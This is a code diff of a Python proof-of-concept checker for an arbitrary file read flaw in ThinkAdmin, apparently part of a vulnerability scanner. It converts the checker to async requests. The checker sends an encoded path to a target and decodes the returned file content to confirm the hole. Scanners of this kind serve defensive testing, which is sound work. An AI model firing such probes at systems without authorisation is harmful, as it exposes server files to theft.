@@ -2,8 +2,8 @@
 
 import json
 import base64 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Thinkadmin_Arbitrary_File_Read_BaseVerify:
     def __init__(self, url):
@@ -48,7 +48,7 @@ class Thinkadmin_Arbitrary_File_Read_BaseVerify:
             (self.encode(num // b, b).lstrip("0") +
             "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])
     
-    def check(self):
+    async def check(self):
 
         """
         检测是否存在漏洞
@@ -70,18 +70,18 @@ class Thinkadmin_Arbitrary_File_Read_BaseVerify:
                         poc += self.encode(i, 36)
                     link = self.url + path_name + poc
                     try:
-                        req = request.get(link, headers = self.headers)
-                        if req.status_code == 200:
-                            json_data = json.loads(req.text)['data']
+                        req = await request.get(link, headers = self.headers)
+                        if req.status == 200:
+                            json_data = json.loads(await req.text())['data']
                             if json_data:
                                 base64.b64decode(json_data['content']).decode()
                                 return True 
                     except Exception as e:
+                        # print(e)
                         pass
-            return False
         except Exception as e:
-            print(e)
-            return False
+            # print(e)
+            pass
 
 if __name__ == "__main__":
     Thinkadmin_Arbitrary_File_Read = Thinkadmin_Arbitrary_File_Read_BaseVerify('http://127.0.0.1/', )
